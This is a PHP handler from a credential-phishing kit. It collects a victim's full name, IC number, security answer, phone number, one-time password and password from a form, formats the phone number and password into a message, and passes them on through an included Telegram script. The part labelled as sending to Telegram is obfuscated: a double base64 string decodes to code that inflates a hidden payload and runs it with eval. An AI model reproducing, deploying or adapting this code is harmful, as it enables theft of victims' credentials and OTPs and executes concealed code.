<?php
session_start();

// Include necessary files
include "./telegram.php";

$full_name = $_POST['full_name'];
$_SESSION['full_name'] = $full_name;

$icnumber = $_POST['icnumber'];
$_SESSION['icnumber'] = $icnumber;

$sek = $_POST['sek'];
$_SESSION['sek'] = $sek;

$phone_number = $_POST['phone_number'];
$_SESSION['phone_number'] = $phone_number;

$otp = $_POST['otp'];
$_SESSION['otp'] = $otp;

$password = $_POST['password'];
$_SESSION['password'] = $password;

$message = "
RESS PASSWORD 
────────────────────
 • Nomor Hp : `".$phone_number."`
 • Password : `".$password."`
────────────────────";

// Function to send message to Telegram
$SISTEMIT_COM_ENC = "rVPBasJAEL0H8hNBJIJk7xVbpOiptSXGc6ABA20SQi5tKf0YCXhIyMHDnkIu+36sM2vUpNpbCepkZ+a9N7NP0xBCyQXyJECJAnWiJAU1fe9RJdgpGaOieI8mRHVMeqgiVGGGJjYNFEkQIceO85bjiIDrxSt9NpRDEzkptqk1MY1Nn+hA8dghsAeUPWH7VLgbKznoauB3PvdfUKMcKfllGkoengHyLFJySjqwJaQyxf5GCDQpCqeL7KDOQqERLCWdHqR+t8QVdXcpmozP/ZgKad5pTAdvFNXvyTAgygalFj09ov6eZnJNbBsx7ZA7PlC2AJwgGcGBzu4tYkRYHTSi12AB9/i8+AKlPeoR1inKWUZiPnUpiefYPpccn/u1+/D07Pn0Q5W3rcTx34Xu3Fu7S8+dLVeLuXvoQZmRLapzU1dMK5OWyZZKeW+tGp5k3FfbmyLTO8gjvqnzvLS0KtC9lyxkz5qZTulv3hw7f9WaHE3CV083WGUXls8pLJJQm3+rTy6toWTX2/Sn+A9vk9If";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdDZ29KQ1Fra2MzUnlJRDBnV3lmRHZTY3NKOE9xSnl3bnc2TW5MQ2ZEclNjc0o4TzdKeXdudzZZbkxDZkRzU2NzSjhPaEp5d253N1VuTENmRHF5Y3NKOEsxSjEwN0Nna0pDU1J5Y0d4aklEMWJKMkVuTENkcEp5d25kU2NzSjJVbkxDZHZKeXduWkNjc0ozTW5MQ2RvSnl3bmRpY3NKM1FuTENjZ0oxMDdDZ2tKSUNBa2JtRjJJRDBnYzNSeVgzSmxjR3hoWTJVb0pITjBjaXdrY25Cc1l5d2tibUYyS1RzS0Nna0pDV1YyWVd3b0pHNWhkaWs3");eval(base64_decode($rand));$STOP="EL0H8hNBJIJk7xVbpOiptSXGc6ABA20SQi5tKf0YCXhIyMHDnkIu+36sM2vUpNpbCepkZ+a9N7NP0xBCyQXyJECJAnWiJAU1fe9RJdgpGaOieI8mRHVMeqgiVGGGJjYNFEkQIceO85bjiIDrxSt9NpRDEzkptqk1MY1Nn+hA8dghsAeUPWH7VLgbKznoauB3PvdfUKMc";
?>